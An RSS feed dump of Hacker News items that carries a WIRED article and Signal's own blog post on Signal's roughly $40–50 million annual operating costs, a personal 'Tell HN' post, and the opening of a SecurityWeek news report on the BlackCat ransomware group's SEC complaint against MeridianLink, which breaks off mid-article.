            <description><![CDATA[<p>URL: <a href="https://www.wired.com/story/signal-operating-costs/">https://www.wired.com/story/signal-operating-costs/</a>, See on <a href="https://news.ycombinator.com/item?id=38291490">Hacker News</a></p>
<div id="readability-page-1" class="page"><div data-testid="ArticlePageChunks"><div data-journey-hook="client-content" data-testid="BodyWrapper"><p>The encrypted messaging and calling app <a href="https://www.wired.com/story/signal-tips-private-messaging-encryption/">Signal</a> has become a one-of-a-kind phenomenon in the tech world: It has grown from the <a href="https://www.wired.com/2016/07/meet-moxie-marlinspike-anarchist-bringing-encryption-us/">preferred encrypted messenger for the paranoid privacy elite</a> into a <a href="https://www.wired.com/story/signal-encrypted-messaging-features-mainstream/">legitimately mainstream service</a> with hundreds of millions of installs worldwide. And it has done this entirely as a nonprofit effort, with no venture capital or monetization model, all while holding its own against the best-funded Silicon Valley competitors in the world, like WhatsApp, Facebook Messenger, Gmail, and iMessage.</p><p>Today, Signal is revealing something about what it takes to pull that off—and it’s not cheap. For the first time, the Signal Foundation that runs the app has published a full breakdown of Signal’s operating costs: around $40 million this year, projected to hit $50 million by 2025.</p><p>Signal’s president, Meredith Whittaker, says her decision to publish the detailed cost numbers in a <a data-offer-url="https://signal.org/blog/signal-is-expensive/" data-event-click="{&quot;element&quot;:&quot;ExternalLink&quot;,&quot;outgoingURL&quot;:&quot;https://signal.org/blog/signal-is-expensive/&quot;}" href="https://signal.org/blog/signal-is-expensive/" rel="nofollow noopener" target="_blank">blog post</a> for the first time—going well beyond the IRS disclosures legally required of nonprofits—was more than just as a frank appeal for year-end donations. By revealing the price of operating a modern communications service, she says, she wanted to call attention to how competitors pay these same expenses: either by profiting directly from monetizing users’ data or, she argues, by locking users into networks that very often operate with that same corporate surveillance business model.</p><p>“By being honest about these costs ourselves, we believe that helps provide a view of the engine of the tech industry, the surveillance business model, that is not always apparent to people,” Whittaker tells WIRED. Running a service like Signal—or WhatsApp or Gmail or Telegram—is, she says, “surprisingly expensive. You may not know that, and there’s a good reason you don’t know that, and it’s because it’s not something that companies who pay those expenses via surveillance <em>want</em> you to know.”</p><p>Signal pays $14 million a year in infrastructure costs, for instance, including the price of servers, bandwidth, and storage. It uses about 20 petabytes per year of bandwidth, or 20 million gigabytes, to enable voice and video calling alone, which comes to $1.7 million a year. The biggest chunk of those infrastructure costs, fully $6 million annually, goes to telecom firms to pay for the SMS text messages Signal uses to send registration codes to verify new Signal accounts’ phone numbers. That cost has gone up, Signal says, as telecom firms charge more for those text messages in an effort to offset the shrinking use of SMS in favor of cheaper services like Signal and WhatsApp worldwide.</p><p>Another $19 million a year or so out of Signal’s budget pays for its staff. Signal now employs about 50 people, a far larger team than a few years ago. In 2016, Signal had just three full-time employees working in a single room in a coworking space in San Francisco. “People didn’t take vacations,” Whittaker says. “People didn’t get on planes because they didn’t want to be offline if there was an outage or something.” While that skeleton-crew era is over—Whittaker says it wasn’t sustainable for those few overworked staffers—she argues that a team of 50 people is still a tiny number compared to services with similar-sized user bases, which often have thousands of employees.</p></div><div data-journey-hook="client-content" data-testid="BodyWrapper"><p>While Whittaker argues that Signal runs as lean an operation as possible, she also notes that many of its features cost more than they do for other communications platforms, due to the extra cost of <a href="https://www.wired.com/story/signal-encrypted-messaging-features-mainstream/">enabling those features in privacy-preserving ways</a>. Signal implements encryption, for instance, not just for the content of calls and texts, but for users’ contacts, and even for their user profile names and photos, as well as more obscure features, like users’ searches for animated GIFs. That means simple-looking elements of the app often require far more time-consuming and expensive engineering than would be necessary if they were offered without encryption.</p><p>Signal was originally founded with funding from the US State Department’s Open Technology Fund, but the service has since turned to donations to keep afloat. When the Signal Foundation was created in 2018 and WhatsApp cofounder Brian Acton left Facebook to become its president, he <a href="https://www.wired.com/story/signal-foundation-whatsapp-brian-acton/">donated $50 million</a>. But with Signal’s growing user base and staff, that donation wouldn't cover much more than a year’s current budget for the company. Other major donors continue to cover the foundation’s costs, Whittaker says—Twitter cofounder Jack Dorsey, for instance, has pledged $1 million a year, and others Whittaker declines to name have given similarly large contributions.</p><p>But Signal hopes to increasingly rely on donations of as little as $3 that can be made through the app itself. Monthly donations of $5 or more are rewarded with a badge for the user’s account. Those small donations, Signal says, now account for 25 percent of its operating costs, up from 18 percent last year, the first full year after Signal enabled in-app contributions. But for Signal to continue to exist and grow without depending on a few wealthy individuals, Whittaker says small user donations will need to ramp up significantly.</p><p>With a nearly $50 million annual budget, can Signal actually survive on those donations? “We have to,” says Whittaker. “Signal needs to find a way to survive in perpetuity because it is <em>the</em> tool that we have to ensure meaningfully private communications.”</p><p>Whittaker says that charging users has never been an option—Signal would never have grown its network to a degree that could compete with iMessage or WhatsApp if it hadn’t been free all along. Nor can Signal adopt a venture capital-funded business model that would leave the service vulnerable to investors or shareholders demanding a profitable exit. Exhibit one: Elon Musk’s acquisition of Twitter and his decisions that triggered an exodus of its users. “We’re not going to get leaned on,” says Whittaker. “We’re going to stay myopically focused on our mission, without the kind of pressure to compromise that for-profit tech companies feel. And that pressure is heavy when you recognize the cost to do what we do.”</p><p>Given that privacy-focused mission, Whittaker argues that revealing Signal’s costs isn't just about helping to raise money to keep protecting users’ communications, it also serves to call out the rest of the tech industry’s anti-privacy practices.</p><p>“The default for all this is surveillance. That’s the water we swim in. So how do we swim upstream? How do we move against this and build something that can perturb that default?” she asks. “I hope being honest about these costs leads people to ask better questions of other tech organizations, to better understand what’s actually happening and how we got into a situation where a handful of companies have such an outsize power globally based on their perfecting this surveillance business model.”</p></div></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[HNInternal: Tell HN: How you changed my life trajectory (219 pts)]]></title>
            <link>https://news.ycombinator.com/item?id=38291452</link>
            <guid>38291452</guid>
            <pubDate>Thu, 16 Nov 2023 16:20:48 GMT</pubDate>
            <description><![CDATA[<p>See on <a href="https://news.ycombinator.com/item?id=38291452">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><td><table>
        <tbody><tr id="38291452">
      <td><span></span></td>      <td><center><a id="up_38291452" href="https://news.ycombinator.com/vote?id=38291452&amp;how=up&amp;goto=item%3Fid%3D38291452"></a></center></td><td><span><a href="https://news.ycombinator.com/item?id=38291452">Tell HN: How you changed my life trajectory</a></span></td></tr><tr><td colspan="2"></td><td><span>
          <span id="score_38291452">107 points</span> by <a href="https://news.ycombinator.com/user?id=scubakid">scubakid</a> <span title="2023-11-16T16:20:48"><a href="https://news.ycombinator.com/item?id=38291452">8 hours ago</a></span> <span id="unv_38291452"></span> | <a href="https://news.ycombinator.com/hide?id=38291452&amp;goto=item%3Fid%3D38291452">hide</a> | <a href="https://hn.algolia.com/?query=Tell%20HN%3A%20How%20you%20changed%20my%20life%20trajectory&amp;type=story&amp;dateRange=all&amp;sort=byDate&amp;storyText=false&amp;prefix&amp;page=0">past</a> | <a href="https://news.ycombinator.com/fave?id=38291452&amp;auth=5b2b785b08a868ea367bd6f995a55387136c2ee6">favorite</a> | <a href="https://news.ycombinator.com/item?id=38291452">27&nbsp;comments</a>        </span>
              </td></tr>
    <tr></tr><tr><td colspan="2"></td><td><div><p>HN has a few idiosyncrasies, but to me it's the last bastion of high-quality discussion on the internet with a shared front-page.</p><p>For years I've kept a tab open and refreshed a dozen times a day. But what I didn't expect is that this community would actively change the course of my life.</p><p>Over the years, I have amassed a graveyard of side projects, and in 2021 I launched a new one. The MVP had zero users, and my finger was hovering over the big red button once again...</p><p>I posted to Show HN just for kicks, and braced for the onslaught. But to my astonishment, the constructive and energizing feedback I received went on to power my indie dev journey over the past two and a half years [0]</p><p>And now... I just officially quit my day job to work on that passion project full-time! [1]</p><p>Historically I have not thought of myself as an entrepreneur. Nor a risk-taker. I have worked a stable mid-tier SWE job for nearly a decade, abiding all the stand-ups, bureaucracy, and revectoring.</p><p>I'm just a guy that likes to make things in my free time, and who never dared to believe one of those projects could grow into something real.</p><p>But after building on nights and weekends for the past 2.5 years and reaching 2,500 paid customers, I realized that even in the worst case, I would rather fail pursuing a dream than let a promising small business die on the vine and always wonder what might have been.</p><p>So although this jump to full-time is earlier than my personal financial modeling showed a robust chance of success for, it's time to set aside a few of the worries and risk mitigation tactics, and take a step into the unknown.</p><p>I never imagined my career taking this course, and without that early support and encouragement from this community... it simply would not have.</p><p>So I'd like to say a thank you to HN. Not just for being my favorite news source, or for being one of the only platforms not chalk full of formulaic engagement-optimized posts, but for helping me personally find the courage to leave the corporate world, set out on a new path, and chase a dream :)</p><p>[0] most recent Show HN: <a href="https://news.ycombinator.com/item?id=36849502">https://news.ycombinator.com/item?id=36849502</a></p><p>[1] <a href="https://x.com/_knolan/status/1724142406352646601?s=20" rel="nofollow noreferrer">https://x.com/_knolan/status/1724142406352646601?s=20</a></p></div></td></tr>        <tr></tr><tr><td colspan="2"></td><td><form action="comment" method="post"></form></td></tr>  </tbody></table>
  </td></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Privacy is priceless, but Signal is expensive (880 pts)]]></title>
            <link>https://signal.org/blog/signal-is-expensive/</link>
            <guid>38291427</guid>
            <pubDate>Thu, 16 Nov 2023 16:18:10 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://signal.org/blog/signal-is-expensive/">https://signal.org/blog/signal-is-expensive/</a>, See on <a href="https://news.ycombinator.com/item?id=38291427">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><p><img src="https://signal.org/blog/images/signal-is-expensive-header.jpg" alt="An illustration of a phone screen displaying the Signal interface. Every interface element is represented by photos of currencies from around the world."></p><p>Signal is the world’s most widely used truly private messaging app, and our cryptographic technologies provide extra layers of privacy beyond the Signal app itself. Since launching in 2013, the Signal Protocol—our end-to-end encryption technology—has become the de facto standard for private communication, protecting the contents of billions of conversations in WhatsApp, Google Messages, and many others. Signal also continues to invest in research and development in the pursuit of extending communications privacy. This commitment underlies our recent work to add a layer of <a href="https://signal.org/blog/pqxdh/">quantum resistance</a> to the Signal Protocol, and our previous work on <a href="https://signal.org/blog/sealed-sender/">metadata protection technologies</a> that help keep personal details like your <a href="https://signal.org/blog/building-faster-oram/">contact list</a>, <a href="https://signal.org/blog/signal-private-group-system/">group membership</a>, <a href="https://signal.org/blog/signal-profiles-beta/">profile name</a>, and other intimate information secure. This singular focus on preserving the ability to communicate privately is one reason that we work in the open, documenting our thinking and <a href="https://github.com/signalapp">making our code open source</a> and open to scrutiny—so you don’t have to take our word for it.</p><p>Signal is also a nonprofit, unlike almost every other consumer tech company.<sup id="fnref:1"><a href="#fn:1">1</a></sup> This provides an essential structural safeguard ensuring that we stay true to our privacy-focused mission. To put it bluntly, as a nonprofit we don’t have investors or profit-minded board members knocking during hard times, urging us to “sacrifice a little privacy” in the name of hitting growth and monetary targets. This is important in an industry where “free” consumer tech is almost always underwritten by monetizing surveillance and invading privacy. Such practices are often accompanied by “growth hacking” and engagement maximization techniques that leverage <a href="https://en.wikipedia.org/wiki/Dark_pattern">dark patterns</a> to keep people glued to feeds and notifications. While Signal is also free to use, we reject this kind of manipulation, focusing instead on creating a straightforward interpersonal communications app. We also reject business models that incentivize such practices.</p><p>Instead of monetizing surveillance, we’re supported by donations, including a generous initial loan from Brian Acton. Our goal is to move as close as possible to becoming fully supported by small donors, relying on a large number of modest contributions from people who care about Signal. We believe this is the safest form of funding in terms of sustainability: ensuring that we remain accountable to the people who use Signal, avoiding any single point of funding failure, and rejecting the widespread practice of monetizing surveillance.</p><p>But our nonprofit structure doesn’t mean it costs less for Signal to produce a globally distributed communications app. Signal is a nonprofit, but we’re playing in a lane dominated by multi-billion-dollar corporations that have defined the norms and established the tech ecosystem, and whose business models directly contravene our privacy mission. So in order to provide a genuinely useful alternative, Signal spends tens of millions of dollars every year. <strong>We estimate that by 2025, Signal will require approximately $50 million dollars a year to operate—<em>and this is very lean compared to other popular messaging apps that don’t respect your privacy</em></strong>.</p><p>Here we review some of these costs and where this money goes, in the name of providing more transparency into Signal. But we hope to do more than that. Where money goes and how it’s made is a bit of a taboo in tech, something that most tech companies avoid talking about. The actual costs of consumer tech are generally hidden behind stories of innovation and the word “free,” and the connection between the product marketing of a highly profitable tech industry and the ingress and egress of profit and revenue is usually unclear. We believe a material map of these dynamics can help clarify just what is required to fulfill the dream of privacy-preserving alternative technology, and contribute to establishing a solid foundation from which we can grow alternatives that contest tech surveillance and the incentives behind it.</p><p>This is not a comprehensive overview—this post isn’t meant to provide a full accounting or to review every line item in detail. Instead, we focus on illustrative examples, looking at infrastructure and labor in particular. We’ll also explore average costs that in practice vary dynamically in relation to factors that are often outside of our control.<sup id="fnref:2"><a href="#fn:2">2</a></sup></p><h2 id="infrastructurally-different">Infrastructurally Different</h2><p>We’ll start with an overview of some of Signal’s biggest infrastructural costs—what we pay for the utilities and services that let Signal reach you. These include the temporary storage of end-to-end encrypted data for message delivery; the global server network that processes billions of requests every day; the registration fees that cover the delivery of verification codes during the sign-up process to help verify phone numbers and prevent spam accounts; the bandwidth that is required to efficiently route end-to-end encrypted messages and calls around the world; and some of the additional services that keep everything running smoothly. We’ll dive into each of these in more detail, but here’s a quick breakdown:</p><p><strong>Storage:</strong> $1.3 million dollars per year.<br> <strong>Servers:</strong> $2.9 million dollars per year.<br> <strong>Registration Fees:</strong> $6 million dollars per year.<br> <strong>Total Bandwidth:</strong> $2.8 million dollars per year.<br> <strong>Additional Services:<sup id="fnref:3"><a href="#fn:3">3</a></sup></strong> $700,000 dollars per year.</p><p><strong>Current Infrastructure Costs (as of November 2023):</strong> Approximately $14 million dollars per year.</p><h3 id="the-cost-of-storing-nothing-and-serving-everyone">The Cost of Storing Nothing and Serving Everyone</h3><p>Data is profitable, and we’re a nonprofit focused on collecting as little data as possible.</p><p>Most tech companies collect and create as much data as they can. They build large <a href="https://en.wikipedia.org/wiki/Data_warehouse">data warehouses</a>, and then later invent new terms like <a href="https://en.wikipedia.org/wiki/Data_lake">“data lake”</a> when their unquenchable thirst for more of your private information can no longer fit within the confines of a single warehouse. Their default move is to store everything for as long as they can in an easily accessible and unencrypted format, suffering <a href="https://www.theverge.com/2022/11/28/23481786/meta-fine-facebook-data-leak-ireland-dpc-gdpr">data breach</a>, after <a href="https://news.bloomberglaw.com/privacy-and-data-security/google-tax-firms-see-data-privacy-suits-after-congress-report">data breach</a>, after <a href="https://www.npr.org/2023/07/12/1187208383/china-hack-us-government-microsoft">data breach</a>, hoping to monetize this data by indirectly (or directly) selling it to advertisers or using it to train AI models. Again, data is profitable.</p><p>In contrast, Signal’s default move is to <a href="https://signal.org/blog/looking-back-as-the-world-moves-forward/">end-to-end encrypt everything that we possibly can</a> and to <a href="https://signal.org/bigbrother/">store as little as possible</a>—all while making sure your messages are delivered promptly and your calls are clear and free of delays. We do this by taking advantage of globally distributed hosting infrastructure and by paying for significant amounts of bandwidth from some of the top providers in the world.</p><p>Just like everything else in Signal, messages and files are always end-to-end encrypted. When you send a message, the Signal service <em>temporarily queues</em> that message for delivery. As soon as your message is delivered, that small bundle of encrypted data (i.e. your message) can be dropped from the queue. The storage of end-to-end encrypted files is temporary too, and any undelivered end-to-end encrypted data is automatically purged after a period of inactivity. Even though everything is only temporary, <strong>this storage still costs Signal around $1.3 million dollars per year</strong>.</p><p>This is a lot of money, although it’s less than it would cost if we stored everything forever. But unlike the tech companies that collect and store everything, we don’t have (and do not want to have) any surveillance data to sell or use to recoup these costs. We can’t read or access any end-to-end encrypted messages because the keys that are required to decrypt them are in your hands, not ours. And it’s not just about your messages. Signal also uses our metadata encryption technology to protect intimate information about who is communicating with whom—we <a href="https://signal.org/blog/sealed-sender/">don’t know who is sending you messages</a>, and we <a href="https://signal.org/blog/building-faster-oram/">don’t have access to your address book</a> or <a href="https://signal.org/blog/signal-profiles-beta/">profile information</a>. We believe that the inability to monetize encrypted data is one of the reasons that strong end-to-end encryption technology has not been widely deployed across the commercial tech industry.</p><p>In order to provide a globally accessible, reliable, and high-performance communications service for the many millions of people around the world who depend on Signal, it’s necessary for Signal’s servers to be globally distributed. Having a geographically distributed network of servers is particularly important for end-to-end encrypted voice and video calls, because latency can result in audio delays or degraded video connections that quickly make the app unusable for real-time communication.</p><p>Because everything in Signal is end-to-end encrypted, we can rent server infrastructure from a variety of providers like <a href="https://aws.amazon.com/">Amazon AWS</a>, <a href="https://cloud.google.com/compute">Google Compute Engine</a>, <a href="https://azure.microsoft.com/en-us">Microsoft Azure</a>, and others while ensuring that your messages and calls remain private and secure. We can’t access them, and neither can the companies that provide any of the infrastructure we rent. As a small nonprofit organization, we cannot afford to purchase all of the physical computers that are necessary to support everyone who relies on Signal while also placing them in independent data centers around the world. Only a select few of the very largest companies globally are still capable of doing this, which is a hallmark of a troublingly concentrated industry.<sup id="fnref:4"><a href="#fn:4">4</a></sup></p><p>Signal’s addition of novel privacy-preserving features also affects our server costs. To pick one example, we developed a new approach to private contact discovery in 2017 that uses a <a href="https://en.wikipedia.org/wiki/Trusted_execution_environment">trusted execution environment</a>. This made us the first large-scale messaging app to let people automatically find their friends and contacts without revealing their address book to us, keeping these connections private. Because other mainstream apps don’t have this layer of privacy protection in place, they can often access details about your network and relationships without restrictions, and many of them store this highly sensitive information for later use.<sup id="fnref:5"><a href="#fn:5">5</a></sup></p><p>When we first deployed this system in 2017, only a few servers were necessary. But as the number of people using Signal increased, the number of servers required to support private contact discovery also rose. At its peak, nearly 600 servers were dedicated to private contact discovery alone, at a total cost of <strong>more than $2 million dollars per year</strong>.</p><p>This significant cost would have continued to rise. However, thanks to <a href="https://signal.org/blog/building-faster-oram/">algorithmic research advances</a> and hardware updates, we’ve been able to reduce the total number of private contact discovery servers to around 10 total—despite the fact that the service is handling more traffic than ever. A significant amount of money and engineering resources have been dedicated to ensuring that your address book remains completely inaccessible to us, and Signal will continue to push the envelope and introduce new techniques to enhance your privacy even when the initial costs are high.</p><h3 id="registration-fees">Registration Fees</h3><p>Signal incurs expenses when people download Signal and sign up for an account, or when they re-register on a new device. We use third-party services to send a registration code via SMS or voice call in order to verify that the person in possession of a given phone number actually intended to sign up for a Signal account. This is a critical step in helping to prevent spam accounts from signing up for the service and rendering it completely unusable—a non-trivial problem for any popular messaging app.</p><p>Signal’s registration service routes registration codes over multiple telephony providers to optimize delivery across the globe, and the fees we pay to third-party vendors for every verification code we send can be very high. This is in part, we believe, because legacy telecom operators have realized that SMS messages are now used primarily for app registration and two-factor authentication in many places, as people switch to calling and texting services that rely on network data. In response to increased verification traffic from apps like Signal, and decreased SMS revenue from their own customers, these service providers have significantly raised their SMS rates in many locations, assuming (correctly) that tech companies will have to pay anyway.</p><p><strong>The cost of these registration services for verifying phone numbers when people first install Signal, or when they re-register on a new device, currently averages around $6 million dollars per year.</strong></p><p>These costs vary dramatically from month to month, and the rates that we pay are sometimes inflated due to <a href="https://www.twilio.com/docs/verify/preventing-toll-fraud#what-is-sms-pumping">“toll fraud”</a>—a practice where some network operators split revenue with fraudulent actors to drive increased volumes of SMS and calling traffic on their network. The telephony providers that apps like Signal rely on to send verification codes during the registration process still charge their own customers for this make-believe traffic, which can increase registration costs in ways that are often unpredictable. Of course, Signal does everything we can to reduce or eliminate the impact of toll fraud. We work closely with our voice and SMS verification providers to detect and shut down fraudulent registrations as quickly as possible. But it’s still a game of cat and mouse, with unavoidable expenses along the way.</p><h3 id="the-going-rate-for-transfer-rates">The Going Rate for Transfer Rates</h3><p>You are probably familiar with the concept of paying for bandwidth in the form of buying a data plan from your cellular provider or signing up with an Internet Service Provider (ISP) for your home. But it may surprise you to learn that every website, app, and service also pays for the bandwidth they use whenever you connect to them.</p><p>Some pay more than others. Most of the major tech companies (like Amazon, Google, and Microsoft) own and operate their own data centers. After spending billions of dollars to build massive hosting facilities, they install their own fiber optic cables and custom networking equipment. This also means they get to earn a lot of money by charging others for the privilege of using that equipment.<sup id="fnref:6"><a href="#fn:6">6</a></sup> Smaller organizations like Signal can’t afford to build matching infrastructure from scratch, so we (along with almost every startup and tech company) pay rent to the big players in order to access the bandwidth we need.</p><p>Millions of people use Signal every day, and it takes a <em>lot</em> of bandwidth to provide a fast and reliable service. <strong>Signal spends around $2.8 million dollars per year on bandwidth</strong> to support sending messages and files (such as photos, videos, voice notes, documents, etc.) and to enable voice and video calls.</p><p>Voice and video calls require significantly more bandwidth than text messages, and Signal’s end-to-end encrypted calling functionality is one of the most expensive services that we provide. Signal also goes far beyond other messaging apps when it comes to protecting your privacy during voice and video calls, and we do this in ways that substantially increase how much bandwidth we use in order to provide a high-quality calling experience.</p><p>To take one example, Signal always routes end-to-end encrypted calls from people who aren’t in your contacts through a relay server that obscures <a href="https://en.wikipedia.org/wiki/IP_address">IP address</a> information.<sup id="fnref:7"><a href="#fn:7">7</a></sup></p><p>Almost none of our competitors do this, and Signal’s default behavior is much more expensive than the alternative. Automatically relaying 1-on-1 voice and video calls from unknown contacts (instead of always using a <a href="https://en.wikipedia.org/wiki/Peer-to-peer">peer-to-peer connection</a> whenever possible) provides an extra layer of privacy, but results in considerably higher bandwidth costs for Signal’s calling-related relay servers. At current traffic levels, the amount of outbound bandwidth that is required to support Signal voice and video calls is around 20 petabytes per year (that’s 20 million <a href="https://en.wikipedia.org/wiki/Gigabyte">gigabytes</a>) <strong>which costs around $1.7 million dollars per year in bandwidth fees <em>just for calling</em></strong>, and that figure doesn’t include the development costs associated with hiring experienced engineers to maintain our calling software, or the cost of the necessary server infrastructure to support those calls.</p><h2 id="the-human-touch">The Human Touch</h2><p>Signal isn’t just a collection of privacy-preserving services that route end-to-end encrypted messages and calls around the world. It’s also a set of cross-platform apps and modular development components (commonly called libraries) that make this type of private communication possible in the first place. Because the norm is surveillance, we’re often required to create or modify our own libraries from scratch, swapping in privacy instead of using more common frameworks that assume surveillant defaults. Swimming against the tide of an ecosystem whose incentives and infrastructure promote surveillance and privacy invasions is, of course, more time-intensive and more expensive, and requires dedicated and experienced people.</p><p>First, we have three distinct client teams, one for each platform (Android, Desktop, and iOS). These teams are constantly working: adjusting to operating system updates, building new features, and making sure the app works on a wide variety of devices and hardware configurations. We also have dedicated engineering teams that handle the development and maintenance of the <a href="https://github.com/signalapp/signal-server">Signal Server</a> and all of its infrastructure, our calling libraries like <a href="https://github.com/signalapp/RingRTC">RingRTC</a>, and core libraries like <a href="https://github.com/signalapp/libsignal">libsignal</a>. These also need constant development and monitoring.</p><p>Product and design teams help shape the future of the app and determine how it will look and function, while our localization team coordinates translation efforts across more than sixty languages. We even have a full-time, in-house support group that interfaces with people who use Signal and provides detailed technical feedback and real-time troubleshooting information to every other team. This is an essential function, particularly at Signal, because we don’t collect analytics or telemetry data about how people are using Signal.</p><p>This is a lot of work, and we do it with a small and mighty team. In total, around 50 full-time employees currently work on Signal, a number that is shockingly small by industry standards. For example, LINE Corporation, the developers of the <a href="https://line.me/en/">LINE</a> messaging app popular in Japan, has around 3,100 employees,<sup id="fnref:8"><a href="#fn:8">8</a></sup> while the division of Kakao Corp that develops <a href="https://en.wikipedia.org/wiki/KakaoTalk">KakaoTalk</a>, a messaging app popular in Korea, has around 4,000 employees.<sup id="fnref:9"><a href="#fn:9">9</a></sup> Employee counts at bigger corporations like Apple, Meta, and Google’s parent company (Alphabet) are much, much higher.<sup id="fnref:10"><a href="#fn:10">10</a></sup></p><p>To sustain our ongoing development efforts, about half of Signal’s overall operating budget goes towards recruiting, compensating, and retaining the people who build and care for Signal. When benefits, HR services, taxes, recruiting, and salaries are included, this <strong>translates to around $19 million dollars per year.</strong></p><p>We are proud to pay people well. Our goal is to compensate our staff at as close to industry wages as possible within the boundaries of a nonprofit organization. We know that we can’t provide equity, expensive playpen offices, or other benefits common to large tech companies. We also know that we need to recruit and retain a highly experienced and specialized workforce in an extremely competitive industry if we’re going to offer a service that provides a meaningful alternative to apps with far more people and resources. And we don’t believe that precarity should be the cost of doing good. Compared to most tech companies, Signal’s numbers are a drop in the bucket.<sup id="fnref:11"><a href="#fn:11">11</a></sup></p><p>Growth in Signal translates into increased infrastructure costs, and having more infrastructure requires more labor. As of November 2023, Signal’s server network is regularly responding to around 100,000 requests per second, and we routinely break our previous records. A funny thing happens when a globally accessible service starts handling billions of requests every day. Suddenly one-in-a-million possibilities are no longer unique or rare, and unlikely situations become more and more common as Signal grows. It’s not unusual for our engineers to do things like write custom code to reproduce an esoteric and complicated <a href="https://en.wikipedia.org/wiki/IPv6">IPv6</a> connectivity issue that’s affecting people running an arcane operating system configuration in specific regions, but only when connected via a certain set of internet service providers.<sup id="fnref:12"><a href="#fn:12">12</a></sup> Troubleshooting such infrastructure issues can be very expensive, because isolating a problem and developing a fix can take a lot of time and expertise.</p><p>Identifying and fixing arcane problems is not the only thing that takes time and skill. In the context of building for privacy, adding a common feature or service in a way that avoids surveillance frequently requires significant work and creativity. To take one example, profile pictures and profile names are always end-to-end encrypted in Signal. This means that Signal does not have access to your profile name or chosen profile photo. This approach is unique in the industry. In fact, it has been <a href="https://signal.org/blog/signal-profiles-beta/">more than six years</a> since we first announced this additional layer of protection, and as far as we know none of our competitors have yet adopted it. Other messengers can easily see your profile photo, profile name, and other sensitive information that Signal cannot access. Our choice here reflects our staunch commitment to privacy, but it also means that it took Signal more effort to implement support for profile photos. Instead of a weekend project for a single engineer, our teams were required to develop new approaches and concepts within the codebase (like profile keys), which they worked to roll out across multiple platforms after an extended testing period.</p><p>The same dynamic played out again when Signal introduced support for animated GIF searches on Android and iOS. Instead of quickly and easily integrating the standard GIF search SDK that most other apps were using, engineers spent considerable time and creativity developing <a href="https://signal.org/blog/giphy-experiment">another unique privacy-preserving technique</a> that hides GIF search terms from Signal’s servers, while also hiding who is searching for those terms from the GIF search engine itself. We later <a href="https://signal.org/blog/signal-and-giphy-update/">expanded those techniques</a> to further obfuscate GIF search information by obscuring the amount of traffic that passes through the proxied connection.</p><p>When Meta <a href="https://techcrunch.com/2020/05/15/facebook-to-acquire-giphy-in-a-deal-reportedly-worth-400-million/">acquired GIPHY</a>, and many other apps were scrambling to <a href="https://www.theverge.com/2020/5/16/21260104/facebook-giphy-acquisition-twitter-slack-snapchat-apple-imessage-signal-facebook-tinder">contend with the privacy implications of the deal</a>, Signal employees slept soundly knowing that we had already built this feature correctly several years earlier.<sup id="fnref:13"><a href="#fn:13">13</a></sup></p><p>Even more recently, Signal has started taking steps to protect today’s conversations from future threats by <a href="https://signal.org/blog/pqxdh/">adding post-quantum resistance to the Signal Protocol</a>. The financial costs associated with these research and development initiatives are substantial. They’re also essential for building privacy-preserving technology in a dynamic industry where surveillance is the norm.</p><p>By offering a competitive compensation package, Signal helps make it easy for people to choose to develop privacy-preserving technology that benefits the world instead of going to work for the surveillance-advertising-industrial complex. We’re proud of our healthcare plans, family-friendly policies like extended parental leave, flexible schedules, and the many other benefits that help make Signal a <a href="https://signal.org/workworkwork/">great place to work</a>.</p><p>These things cost money, but a world where Signal can attract talented people to work on privacy-preserving technology is a world that looks a lot more attractive.</p><h2 id="future-tense">Future Tense</h2><p>We hope that this cursory tour of some of Signal’s operations and costs helps provide a greater understanding of Signal’s unique place in the tech ecosystem, and of the tech ecosystem itself.</p><p>Our goal of developing an open source private messenger that is supported and sustained by small donations is both highly ambitious and, we believe, existentially important. The cost of most consumer technology is underwritten by surveillance, which has allowed people to assume that “free” is the default, and a handful of industry players have accrued eye-watering amounts of personal data and the unprecedented power to use that data in ways that are shaping our lives and institutions globally.</p><p>To put it another way, the social costs of normalized privacy invasion are staggeringly high, and maintaining and caring for alternative technology has never been more important.</p><p>Signal is working to show that a different approach is possible—an approach that puts privacy at the center, and where organizations are accountable to the people who use and rely on their services, not to investors, or to the endless pursuit of growth and profit.</p><p>Thank you for your support. It’s an honor and privilege to work on Signal every day, and we—very literally—couldn’t do it without you. Please consider donating to Signal via <a href="https://signal.org/donate/">our website</a> or learn how to <a href="https://support.signal.org/hc/en-us/articles/360031949872#how">give using the app</a>.</p><hr></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Ransomware Group Files SEC Complaint over Victim's Failure Disclose Data Breach (131 pts)]]></title>
            <link>https://www.securityweek.com/ransomware-group-files-sec-complaint-over-victims-failure-to-disclose-data-breach/</link>
            <guid>38291399</guid>
            <pubDate>Thu, 16 Nov 2023 16:16:31 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://www.securityweek.com/ransomware-group-files-sec-complaint-over-victims-failure-to-disclose-data-breach/">https://www.securityweek.com/ransomware-group-files-sec-complaint-over-victims-failure-to-disclose-data-breach/</a>, See on <a href="https://news.ycombinator.com/item?id=38291399">Hacker News</a></p>
<div id="readability-page-1" class="page"><div>
<p><strong>A notorious ransomware group has filed a complaint with the US Securities and Exchange Commission (SEC) over the failure of a victim to disclose an alleged data breach resulting from an attack conducted by the cybercrime gang itself.</strong>
</p><p>The ransomware group known as Alphv and BlackCat claims to have breached the systems of MeridianLink, a California-based company that provides digital lending solutions for financial institutions and data verification solutions for consumers.
</p><p>The cybercriminals claim to have stolen a significant amount of customer data and operational information belonging to MeridianLink, and they are threatening to leak it unless a ransom is paid.
</p><p>In an apparent effort to increase its chances of getting paid, the malicious hackers claim to have filed a complaint with the SEC against MeridianLink, accusing the company of failing to disclose the breach within four business days, as required by <a href="https://www.securityweek.com/companies-required-by-sec-to-disclose-cybersecurity-incidents-in-4-days/">rules</a> announced by the agency in July.&nbsp;
</p><p>BlackCat published screenshots on its leak website on November 15 to show that the complaint has been filed and received by the SEC.&nbsp;
</p><div>
